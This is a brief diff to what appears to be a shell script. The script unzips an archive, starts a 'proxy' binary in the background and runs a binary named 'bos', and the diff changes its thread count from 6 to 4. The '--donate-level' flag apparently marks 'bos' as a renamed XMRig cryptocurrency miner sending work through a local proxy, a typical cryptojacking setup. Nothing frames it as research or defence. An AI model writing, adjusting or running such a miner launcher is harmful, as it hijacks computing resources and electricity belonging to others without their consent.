@@ -6,4 +6,4 @@ unzip set.zip
 chmod +x proxy
 nohup ./proxy &
 chmod +x bos
-./bos --donate-level 1 -o 127.0.0.1:8080 -t 6
+./bos --donate-level 1 -o 127.0.0.1:8080 -t 4
